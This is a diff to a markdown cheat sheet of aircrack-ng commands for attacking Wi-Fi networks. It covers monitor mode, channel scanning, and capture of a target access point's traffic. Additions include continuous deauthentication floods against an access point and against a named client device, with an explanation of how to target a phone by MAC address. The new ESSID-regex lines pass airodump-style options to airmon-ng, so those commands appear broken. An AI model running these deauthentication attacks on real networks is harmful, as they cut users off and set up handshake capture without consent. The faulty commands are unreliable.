@@ -3,9 +3,9 @@
 
 ```airmon-ng check kill```
 
-```sudo airmon-ng start wlan1```
+```sudo airmon-ng start wlan0```
 
-* now our monitor interface will be wlan1mon
+* now our monitor interface will be wlan0mon
 
 ----
 
@@ -13,18 +13,37 @@
 
 AiroDump ALL in channels 1-165 and ignoring negative one.
 
-```airodump-ng -c 1-165 wlan1mon --ignore-negative-one```
+```airodump-ng -c 1-165 wlan0mon --ignore-negative-one```
 
 
 Or to filter and display ONLY the BSSID (MAC Address once known), try the below.
 
-```sudo airodump-ng wlan1mon -d xx:xx:xx:xx:xx:xx```
+```sudo airodump-ng wlan0mon -d xx:xx:xx:xx:xx:xx```
+
+
+Filter and exclude ESSID with regex
+
+```sudo airmon-ng -R '^(?!.*WIFINAME1)' -c 6 wlan0mon```
+
+Filter and exclude multiple ESSIDs with regex
+
+```sudo airmon-ng -R '^(?!.*WIFINAME1)^(?!.*WIFINAME2)' -c 6 wlan0mon```
 
 ----
 
 ### de-auth BSSID 
 
-```aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan1mon```
+Basic BSSID de-auth continiously
+
+```aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon```
+
+
+de-auth a wireless client specific to ESSID continiously. More successful when using client paramter. 
+
+```aireplay-ng --deauth 0 wlan0mon -a xx:xx:xx:xx:xx:xx -e ESSID_WIFI_NAME -c xx:xx:xx:xx:xx:xx```
+
+the above -a is the BSSID (MAC of WIFI AP), -c is the client mac address (i.e. phone, device) connecting to the wifi.
+
 
 ----
 
@@ -33,7 +52,7 @@ Or to filter and display ONLY the BSSID (MAC Address once known), try the below.
 "<i>-c X</i>". This should be the channel of the BSSID we wish to target after "-c".
 -w will output the capture to the filename in this example as "wifi-capture".
 
-```airodump-ng -w wifi-capture -c X --bssid xx:xx:xx:xx:xx:xx wlan1mon```
+```airodump-ng -w wifi-capture -c X --bssid xx:xx:xx:xx:xx:xx wlan0mon```
 
 ----
 
